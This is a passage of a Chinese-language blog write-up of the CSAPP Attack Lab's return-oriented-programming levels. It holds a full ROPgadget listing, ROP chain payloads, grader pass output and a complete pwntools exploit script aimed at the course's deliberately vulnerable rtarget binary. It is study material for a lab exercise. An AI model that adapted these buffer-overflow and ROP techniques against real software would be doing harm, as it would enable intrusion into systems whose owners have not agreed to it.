class="line">p.sendline(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="Rtarget-Return-Oriented-Program"><a href="#Rtarget-Return-Oriented-Program" class="headerlink" title="Rtarget: Return Oriented Program"></a>Rtarget: Return Oriented Program</h1><p>溢出点没变，还是一个gets加上32字节长的栈上字符数组的oob。但是这里就是正常的程序了：栈地址随机化且堆栈不可执行。</p>
+<p>要求只能用movq, popq, ret, nop指令同时只允许使用rax-rdi寄存器。思路类似，只不过我们有工具可以搜索gadget就会方便很多。按照文档的意思，源文件将那些好用的机器指令藏在了其他指令的立即数中（或者类似的思路）。另外我们只能用gadget_farm中的gadget，即0x401994-0x401ab7地址范围内的gadget。</p>
+<h2 id="Lv4：用Gadget和ROP实现Lv2的参数传递"><a href="#Lv4：用Gadget和ROP实现Lv2的参数传递" class="headerlink" title="Lv4：用Gadget和ROP实现Lv2的参数传递"></a>Lv4：用Gadget和ROP实现Lv2的参数传递</h2><p>需要将rdi改成cookie就行，但是搜一下发现没有<code>pop rdi</code><br>全部的搜索结果：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./rtarget  --range 0x401994-0x401ab7</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004019d8 : add al, 0x37 ; ret</span><br><span class="line">0x00000000004019d4 : add bl, al ; lea rax, [rdi + rsi] ; ret</span><br><span class="line">0x0000000000401998 : add bl, al ; mov eax, 0x909078fb ; ret</span><br><span class="line">0x00000000004019d2 : add byte ptr [rax], al ; add bl, al ; lea rax, [rdi + rsi] ; ret</span><br><span class="line">0x0000000000401996 : add byte ptr [rax], al ; add bl, al ; mov eax, 0x909078fb ; ret</span><br><span class="line">0x0000000000401997 : add byte ptr [rax], al ; ret</span><br><span class="line">0x0000000000401a22 : add cl, cl ; ret</span><br><span class="line">0x0000000000401995 : add dword ptr [rax], eax ; add byte ptr [rax], al ; ret</span><br><span class="line">0x0000000000401a94 : and al, al ; ret</span><br><span class="line">0x00000000004019f3 : and bl, bl ; ret</span><br><span class="line">0x0000000000401aa8 : and dl, dl ; ret</span><br><span class="line">0x0000000000401a8f : cmp al, 0xc3 ; mov eax, 0xc020ce88 ; ret</span><br><span class="line">0x0000000000401a29 : cmp al, al ; ret</span><br><span class="line">0x0000000000401a36 : cmp cl, cl ; ret</span><br><span class="line">0x0000000000401a79 : cmp dl, dl ; ret</span><br><span class="line">0x0000000000401a3b : enter -0x1f77, -0x3d ; ret</span><br><span class="line">0x0000000000401a6c : fcmovnb st(0), st(3) ; mov dword ptr [rdi], 0xc391d189 ; ret</span><br><span class="line">0x00000000004019f4 : fcmovnb st(0), st(3) ; mov eax, 0xc048d189 ; ret</span><br><span class="line">0x0000000000401a31 : fcmovnb st(0), st(3) ; mov eax, 0xc938d189 ; ret</span><br><span class="line">0x00000000004019aa : jae 0x401a04 ; nop ; ret</span><br><span class="line">0x000000000040199c : js 0x40192e ; nop ; ret</span><br><span class="line">0x00000000004019ec : js 0x4019b7 ; ret</span><br><span class="line">0x0000000000401a8a : lea eax, [rdi + 0x3cc7c289] ; ret</span><br><span class="line">0x00000000004019d7 : lea eax, [rdi + rsi] ; ret</span><br><span class="line">0x0000000000401a03 : lea eax, [rdi - 0x1f76b7bf] ; ret</span><br><span class="line">0x00000000004019ef : lea eax, [rdi - 0x24df2e73] ; ret</span><br><span class="line">0x0000000000401a9e : lea eax, [rdi - 0x2d9f3d77] ; ret</span><br><span class="line">0x00000000004019e8 : lea eax, [rdi - 0x36873177] ; ret</span><br><span class="line">0x0000000000401a1e : lea eax, [rdi - 0x36ff3d77] ; ret</span><br><span class="line">0x0000000000401a47 : lea eax, [rdi - 0x381f76b8] ; ret</span><br><span class="line">0x0000000000401a39 : lea eax, [rdi - 0x3c1f7638] ; ret</span><br><span class="line">0x00000000004019a0 : lea eax, [rdi - 0x3c3876b8] ; ret</span><br><span class="line">0x0000000000401a61 : lea eax, [rdi - 0x3c6d3177] ; ret</span><br><span class="line">0x0000000000401a40 : lea eax, [rdi - 0x3f7b3d77] ; ret</span><br><span class="line">0x0000000000401a25 : lea eax, [rdi - 0x3fc73177] ; ret</span><br><span class="line">0x0000000000401a83 : lea eax, [rdi - 0x6f1f76f8] ; ret</span><br><span class="line">0x0000000000401a11 : lea eax, [rdi - 0x6f6f3177] ; ret</span><br><span class="line">0x00000000004019a7 : lea eax, [rdi - 0x6fa78caf] ; ret</span><br><span class="line">0x00000000004019d6 : lea rax, [rdi + rsi] ; ret</span><br><span class="line">0x00000000004019ed : leave ; ret</span><br><span class="line">0x0000000000401a08 : loopne 0x4019cd ; mov dword ptr [rdi], 0xc908c288 ; ret</span><br><span class="line">0x0000000000401a1b : loopne 0x4019de ; ret</span><br><span class="line">0x0000000000401a5e : loopne 0x4019f1 ; ret</span><br><span class="line">0x0000000000401a3d : loopne 0x401a02 ; ret</span><br><span class="line">0x0000000000401a4b : loopne 0x401a14 ; ret</span><br><span class="line">0x0000000000401a87 : loopne 0x401a19 ; ret</span><br><span class="line">0x0000000000401aaf : loopne 0x401a41 ; ret</span><br><span class="line">0x0000000000401a9b : loopne 0x401a5f ; ret</span><br><span class="line">0x0000000000401a92 : mov dh, cl ; and al, al ; ret</span><br><span class="line">0x0000000000401a0c : mov dl, al ; or cl, cl ; ret</span><br><span class="line">0x00000000004019e1 : mov dword ptr [rdi], 0x9090d199 ; ret</span><br><span class="line">0x00000000004019c3 : mov dword ptr [rdi], 0x90c78948 ; ret</span><br><span class="line">0x0000000000401aab : mov dword ptr [rdi], 0x90e08948 ; ret</span><br><span class="line">0x0000000000401a5a : mov dword ptr [rdi], 0x91e08948 ; ret</span><br><span class="line">0x00000000004019b5 : mov dword ptr [rdi], 0x9258c254 ; ret</span><br><span class="line">0x00000000004019fc : mov dword ptr [rdi], 0xc084d181 ; ret</span><br><span class="line">0x0000000000401a97 : mov dword ptr [rdi], 0xc2e08948 ; ret</span><br><span class="line">0x0000000000401a6e : mov dword ptr [rdi], 0xc391d189 ; ret</span><br><span class="line">0x00000000004019bc : mov dword ptr [rdi], 0xc78d4863 ; ret</span><br><span class="line">0x00000000004019ae : mov dword ptr [rdi], 0xc7c78948 ; ret</span><br><span class="line">0x0000000000401a0a : mov dword ptr [rdi], 0xc908c288 ; ret</span><br><span class="line">0x0000000000401a7c : mov dword ptr [rdi], 0xc908ce09 ; ret</span><br><span class="line">0x0000000000401a75 : mov dword ptr [rdi], 0xd238c281 ; ret</span><br><span class="line">0x0000000000401a2c : mov dword ptr [rdi], 0xdb08ce81 ; ret</span><br><span class="line">0x000000000040199a : mov eax, 0x909078fb ; ret</span><br><span class="line">0x00000000004019db : mov eax, 0x90c2895c ; ret</span><br><span class="line">0x0000000000401a91 : mov eax, 0xc020ce88 ; ret</span><br><span class="line">0x00000000004019f6 : mov eax, 0xc048d189 ; ret</span><br><span class="line">0x0000000000401a18 : mov eax, 0xc1e08948 ; ret</span><br><span class="line">0x00000000004019ca : mov eax, 0xc3905829 ; ret</span><br><span class="line">0x0000000000401a33 : mov eax, 0xc938d189 ; ret</span><br><span class="line">0x0000000000401a54 : mov eax, 0xc9c4c289 ; ret</span><br><span class="line">0x0000000000401a4e : mov eax, 0xd208d199 ; ret</span><br><span class="line">0x0000000000401aa5 : mov eax, 0xd220ce8d ; ret</span><br><span class="line">0x0000000000401a68 : mov eax, 0xdb08d189 ; ret</span><br><span class="line">0x0000000000401994 : mov eax, 1 ; ret</span><br><span class="line">0x0000000000401a86 : mov eax, esp ; nop ; ret</span><br><span class="line">0x0000000000401a07 : mov eax, esp ; ret</span><br><span class="line">0x0000000000401a9a : mov eax, esp ; ret 0x8dc3</span><br><span class="line">0x0000000000401a5d : mov eax, esp ; xchg ecx, eax ; ret</span><br><span class="line">0x00000000004019a4 : mov ebx, 0x51878dc3 ; jae 0x401a04 ; nop ; ret</span><br><span class="line">0x00000000004019b3 : mov ebx, 0xc25407c7 ; pop rax ; xchg edx, eax ; ret</span><br><span class="line">0x0000000000401a34 : mov ecx, edx ; cmp cl, cl ; ret</span><br><span class="line">0x0000000000401a69 : mov ecx, edx ; or bl, bl ; ret</span><br><span class="line">0x0000000000401a70 : mov ecx, edx ; xchg ecx, eax ; ret</span><br><span class="line">0x00000000004019b2 : mov edi, 0x5407c7c3 ; ret 0x9258</span><br><span class="line">0x00000000004019c6 : mov edi, eax ; nop ; ret</span><br><span class="line">0x00000000004019a3 : mov edi, eax ; ret</span><br><span class="line">0x0000000000401a20 : mov edx, eax ; add cl, cl ; ret</span><br><span class="line">0x00000000004019dd : mov edx, eax ; nop ; ret</span><br><span class="line">0x0000000000401a42 : mov edx, eax ; test al, al ; ret</span><br><span class="line">0x0000000000401a27 : mov esi, ecx ; cmp al, al ; ret</span><br><span class="line">0x00000000004019ea : mov esi, ecx ; js 0x4019b7 ; ret</span><br><span class="line">0x0000000000401a13 : mov esi, ecx ; nop ; nop ; ret</span><br><span class="line">0x0000000000401a63 : mov esi, ecx ; xchg edx, eax ; ret</span><br><span class="line">0x0000000000401aad : mov rax, rsp ; nop ; ret</span><br><span class="line">0x0000000000401a06 : mov rax, rsp ; ret</span><br><span class="line">0x0000000000401a99 : mov rax, rsp ; ret 0x8dc3</span><br><span class="line">0x0000000000401a5c : mov rax, rsp ; xchg ecx, eax ; ret</span><br><span class="line">0x00000000004019c5 : mov rdi, rax ; nop ; ret</span><br><span class="line">0x00000000004019a2 : mov rdi, rax ; ret</span><br><span class="line">0x000000000040199d : nop ; nop ; ret</span><br><span class="line">0x000000000040199e : nop ; ret</span><br><span class="line">0x0000000000401a30 : or bl, bl ; ret</span><br><span class="line">0x0000000000401a0e : or cl, cl ; ret</span><br><span class="line">0x0000000000401a51 : or dl, dl ; ret</span><br><span class="line">0x0000000000401a7e : or esi, ecx ; or cl, cl ; ret</span><br><span class="line">0x00000000004019ab : pop rax ; nop ; ret</span><br><span class="line">0x00000000004019b9 : pop rax ; xchg edx, eax ; ret</span><br><span class="line">0x00000000004019dc : pop rsp ; mov edx, eax ; nop ; ret</span><br><span class="line">0x00000000004019a9 : push rcx ; jae 0x401a04 ; nop ; ret</span><br><span class="line">0x00000000004019b7 : push rsp ; ret 0x9258</span><br><span class="line">0x0000000000401999 : ret</span><br><span class="line">0x0000000000401a8d : ret 0x3cc7</span><br><span class="line">0x0000000000401a9c : ret 0x8dc3</span><br><span class="line">0x00000000004019b8 : ret 0x9258</span><br><span class="line">0x0000000000401a43 : ret 0xc084</span><br><span class="line">0x00000000004019de : ret 0xc390</span><br><span class="line">0x0000000000401a21 : ret 0xc900</span><br><span class="line">0x0000000000401a0d : ret 0xc908</span><br><span class="line">0x0000000000401a56 : ret 0xc9c4</span><br><span class="line">0x0000000000401a78 : ret 0xd238</span><br><span class="line">0x0000000000401aa1 : ret 0xd260</span><br><span class="line">0x0000000000401a45 : rol bl, 0x8d ; xchg dword ptr [rax - 0x77], ecx ; loopne 0x401a14 ; ret</span><br><span class="line">0x0000000000401a01 : rol bl, 0x8d ; xchg dword ptr [rcx + 0x48], eax ; mov eax, esp ; ret</span><br><span class="line">0x0000000000401aa9 : rol bl, cl ; mov dword ptr [rdi], 0x90e08948 ; ret</span><br><span class="line">0x0000000000401a7a : rol bl, cl ; mov dword ptr [rdi], 0xc908ce09 ; ret</span><br><span class="line">0x0000000000401a52 : rol bl, cl ; mov eax, 0xc9c4c289 ; ret</span><br><span class="line">0x0000000000401aa3 : rol bl, cl ; mov eax, 0xd220ce8d ; ret</span><br><span class="line">0x00000000004019f8 : ror dword ptr [rax - 0x40], 1 ; ret</span><br><span class="line">0x0000000000401a50 : ror dword ptr [rax], 1 ; rol bl, cl ; mov eax, 0xc9c4c289 ; ret</span><br><span class="line">0x0000000000401a35 : sar dword ptr [rax], 1 ; leave ; ret</span><br><span class="line">0x00000000004019f2 : shl dword ptr [rax], 1 ; fcmovnb st(0), st(3) ; mov eax, 0xc048d189 ; ret</span><br><span class="line">0x000000000040199b : sti ; js 0x40192e ; nop ; ret</span><br><span class="line">0x00000000004019cb : sub dword ptr [rax - 0x70], ebx ; ret</span><br><span class="line">0x0000000000401a00 : test al, al ; ret</span><br><span class="line">0x0000000000401a48 : xchg dword ptr [rax - 0x77], ecx ; loopne 0x401a14 ; ret</span><br><span class="line">0x0000000000401a84 : xchg dword ptr [rax], ecx ; mov eax, esp ; nop ; ret</span><br><span class="line">0x0000000000401a04 : xchg dword ptr [rcx + 0x48], eax ; mov eax, esp ; ret</span><br><span class="line">0x00000000004019a8 : xchg dword ptr [rcx + 0x73], edx ; pop rax ; nop ; ret</span><br><span class="line">0x0000000000401a3a : xchg eax, ecx ; mov eax, esp ; ret</span><br><span class="line">0x0000000000401a5f : xchg ecx, eax ; ret</span><br><span class="line">0x00000000004019ba : xchg edx, eax ; ret</span><br></pre></td></tr></table></figure>
+
+<p>那只能构造ROP chain了。写入cookie的话起手肯定是pop。我们后面大概率都是以这个0x4019ab的<code>pop rax; nop; ret</code>开头，然后操作rax寄存器。因此就是<code>pop rax-&gt;mov rdi,rax</code>类似的思路。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop_rax_ret=<span class="number">0x4019ab</span></span><br><span class="line">mov_rdi_rax_ret=<span class="number">0x4019a2</span></span><br><span class="line">payload4=<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>+p64(pop_rax_ret)+p64(cookie)+p64(mov_rdi_rax_ret)+p64(touch2)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Cookie: 0x59b997fa<br>Type string:Touch2!: You called touch2(0x59b997fa)<br>Valid solution for level 2 with target rtarget<br>PASS: Would have posted the following:<br>   user id    bovik<br>   course    15213-f15<br>   lab    attacklab<br>   result    1:PASS:0xffffffff:rtarget:2:61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</p>
+</blockquote>
+<h2 id="Lv5-用Gadget调用touch3"><a href="#Lv5-用Gadget调用touch3" class="headerlink" title="Lv5: 用Gadget调用touch3"></a>Lv5: 用Gadget调用touch3</h2><blockquote>
+<p>说明书中说“You have also gotten 95&#x2F;100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now.” 这一关其实可以不做了。但是我们又不是cmu的学生，还是来看看。</p>
+</blockquote>
+<p>touch3和hexmatch都是一样的函数，覆盖也是一样的。这个难点在于，我们唯一能够写入的地方是栈而函数参数需要传指针，我们需要泄露或者想办法传入和栈有关的地址。这需要用到gadget中和rsp相关的指令。</p>
+<p>这里就有一个问题。借助<code>0x0000000000401a06 : mov rax, rsp ; ret</code>只能获取这条指令位置（下一个）的rsp，而为了保证控制流gadget地址后面一定接着是地址，那字符串放在最后的话如何能让rdi传入地址？这时候我考虑第一个<code>add al, 0x37</code>这个gadget，在中间填充到0x37后让rax最后刚好对到字符串地址，然后使用<code>mov rdi,rax</code>就行了。</p>
+<p>但是本来感觉做出来了结果段错误，莫名其妙（开始显然没想到栈对齐），一步一步调试调试到sprintf内部这里：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fc5c0d8f6e8 &lt;__vsprintf_internal+88&gt;     movaps xmmword ptr [rsp], xmm0</span><br></pre></td></tr></table></figure>
+<p>此时RSP的值是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RSP  0x7ffd605c4bb8</span><br></pre></td></tr></table></figure>
+<p>这条指令是一个SSE指令，它的执行需要栈对齐，也就是RSP要对齐16字节，显然是不对的。因此在我们能控制的范围内需要调整payload，但是很遗憾，这个payload我用到了<code>0x00000000004019d8 : add al, 0x37 ; ret</code>这条，0x37的偏移是算好的了。因此要调节ret，我删除了一个ret用8个’a’填充在后面之后成功过关。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gadgets:</span></span><br><span class="line">pop_rax_ret=<span class="number">0x4019ab</span></span><br><span class="line">mov_rdi_rax_ret=<span class="number">0x4019a2</span></span><br><span class="line">ret=<span class="number">0x401999</span></span><br><span class="line">lea_eax_rdi_plus_rsi_ret=<span class="number">0x4019d7</span></span><br><span class="line">mov_rax_rsp_ret=<span class="number">0x401a06</span> </span><br><span class="line">add_al_0x37_ret=<span class="number">0x4019d8</span> <span class="comment"># 加0x37，6个地址加7字节后写cookie</span></span><br><span class="line">payload5=<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>+p64(mov_rax_rsp_ret)+p64(add_al_0x37_ret)+p64(mov_rdi_rax_ret)+p64(ret)+p64(ret)+p64(touch3)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span>+str_cookie</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Type string:Touch3!: You called touch3(“59b997fa”)<br>Valid solution for level 3 with target rtarget<br>PASS: Would have posted the following:<br>   user id    bovik<br>   course    15213-f15<br>   lab    attacklab<br>   result    1:PASS:0xffffffff:rtarget:3:61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 06 1A 40 00 00 00 00 00 D8 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 99 19 40 00 00 00 00 00 99 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 35 39 62 39 39 37 66 61 00</p>
+</blockquote>
+<p>最后附上Rtarget的exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#*-* coding: utf-8 *-*</span></span><br><span class="line"><span class="comment"># EXP for ctarget</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">argv=[<span class="string">&#x27;./rtarget&#x27;</span>,<span class="string">&#x27;-q&#x27;</span>]</span><br><span class="line">p = process(argv)</span><br><span class="line"></span><br><span class="line">cookie=<span class="number">0x59b997fa</span></span><br><span class="line">str_cookie=<span class="string">b&quot;59b997fa\x00&quot;</span></span><br><span class="line">touch1=<span class="number">0x4017c0</span></span><br><span class="line">touch2=<span class="number">0x4017ec</span></span><br><span class="line">touch3=<span class="number">0x4018FA</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets:</span></span><br><span class="line">pop_rax_ret=<span class="number">0x4019ab</span></span><br><span class="line">mov_rdi_rax_ret=<span class="number">0x4019a2</span></span><br><span class="line">ret=<span class="number">0x401999</span></span><br><span class="line">lea_eax_rdi_plus_rsi_ret=<span class="number">0x4019d7</span></span><br><span class="line">mov_rax_rsp_ret=<span class="number">0x401a06</span> </span><br><span class="line">add_al_0x37_ret=<span class="number">0x4019d8</span> <span class="comment"># 加0x37，6个地址加7字节后写cookie</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload4=<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>+p64(pop_rax_ret)+p64(cookie)+p64(mov_rdi_rax_ret)+p64(touch2)</span><br><span class="line">payload5=<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>+p64(mov_rax_rsp_ret)+p64(add_al_0x37_ret)+p64(mov_rdi_rax_ret)+p64(ret)+p64(ret)+p64(touch3)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span>+str_cookie</span><br><span class="line"><span class="comment"># pyaload5能将字符串地址传入rdi，动调确定一下为什么不行-栈在运行到sprintf内部的时候没对齐，删一个ret指令用a在后面填上就过了</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.sendline(payload5)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>难度不大的rop训练，但是比较锻炼人，hexmatch的栈覆盖不读汇编是发现不了的，而且通过rtarget的这个训练我终于明白了所谓“64位远程打不通加ret栈对齐”的含义了。受益匪浅，这玩意没有ROPGadgets真的是人能做出来的吗。。</p>
+
+    </article>
+    <!-- license -->
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2024/06/06/CSAPP-Labs%E2%80%94%E2%80%94Bomb-Lab/" title="CSAPP Labs——Bomb Lab">
+                    <div class="prevTitle">CSAPP Labs——Bomb Lab</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:zj_w1nd@163.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/ZjW1nd" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://steamcommunity.com/id/ZJwind/" class="iconfont-archer steam" target="_blank" title=steam></a>
+            
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv"><span id="busuanzi_value_site_pv"></span> readers</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%A6%81%E6%B1%82"><span class="toc-number">1.</span> <span class="toc-text">介绍和要求</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ctarget%EF%BC%9ACode-Injection"><span class="toc-number">2.</span> <span class="toc-text">Ctarget：Code Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Lv1-%E7%AE%80%E5%8D%95ret2txt%EF%BC%8C%E5%8A%AB%E6%8C%81%E5%88%B0touch1"><span class="toc-number">2.1.</span> <span class="toc-text">Lv1: 简单ret2txt，劫持到touch1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lv2%EF%BC%9Aret2sc%E4%BC%A0%E9%80%92%E5%8F%82%E6%95%B0%EF%BC%8C%E6%94%B9%E5%8F%98%E5%88%86%E6%94%AF"><span class="toc-number">2.2.</span> <span class="toc-text">Lv2：ret2sc传递参数，改变分支</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lv3-ret2sc%E4%BC%A0%E9%80%92%E5%8F%82%E6%95%B0%EF%BC%88%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8C%87%E9%92%88%EF%BC%89%EF%BC%8C%E6%94%B9%E5%8F%98%E5%88%86%E6%94%AF"><span class="toc-number">2.3.</span> <span class="toc-text">Lv3: ret2sc传递参数（字符串指针），改变分支</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Rtarget-Return-Oriented-Program"><span class="toc-number">3.</span> <span class="toc-text">Rtarget: Return Oriented Program</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Lv4%EF%BC%9A%E7%94%A8Gadget%E5%92%8CROP%E5%AE%9E%E7%8E%B0Lv2%E7%9A%84%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92"><span class="toc-number">3.1.</span> <span class="toc-text">Lv4：用Gadget和ROP实现Lv2的参数传递</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lv5-%E7%94%A8Gadget%E8%B0%83%E7%94%A8touch3"><span class="toc-number">3.2.</span> <span 